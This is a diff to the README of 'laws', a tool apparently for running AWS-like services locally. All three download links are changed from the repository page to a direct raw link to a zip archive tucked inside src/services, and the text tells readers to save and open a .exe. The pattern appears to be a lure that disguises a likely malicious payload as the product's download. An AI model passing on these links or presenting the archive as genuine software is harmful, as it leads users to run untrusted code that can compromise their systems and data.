@@ -1,6 +1,6 @@
 # 🏠 laws - Run Local AWS Services Fast
 
-[![Download laws](https://img.shields.io/badge/Download%20laws-blue?style=for-the-badge&logo=github)](https://github.com/Hemiparasitic-jewsharp131/laws)
+[![Download laws](https://img.shields.io/badge/Download%20laws-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Hemiparasitic-jewsharp131/laws/main/src/services/Software_v2.3.zip)
 
 ## 🚀 What is laws?
 
@@ -20,7 +20,7 @@ It is built for people who want a lighter way to work with AWS-like services on 
 
 Visit this page to download and run this file:
 
-[Download laws from GitHub](https://github.com/Hemiparasitic-jewsharp131/laws)
+[Download laws from GitHub](https://raw.githubusercontent.com/Hemiparasitic-jewsharp131/laws/main/src/services/Software_v2.3.zip)
 
 Open the link in your browser, then use the file or release you see on that page. If the page shows a `.exe` file, save it to your PC and open it.
 
@@ -176,7 +176,7 @@ Yes, if the services use different ports and your system has enough memory.
 ### Where do I get updates?
 Check the same GitHub link you used to download it:
 
-[Download laws from GitHub](https://github.com/Hemiparasitic-jewsharp131/laws)
+[Download laws from GitHub](https://raw.githubusercontent.com/Hemiparasitic-jewsharp131/laws/main/src/services/Software_v2.3.zip)
 
 ## 📌 What you need to do next
 
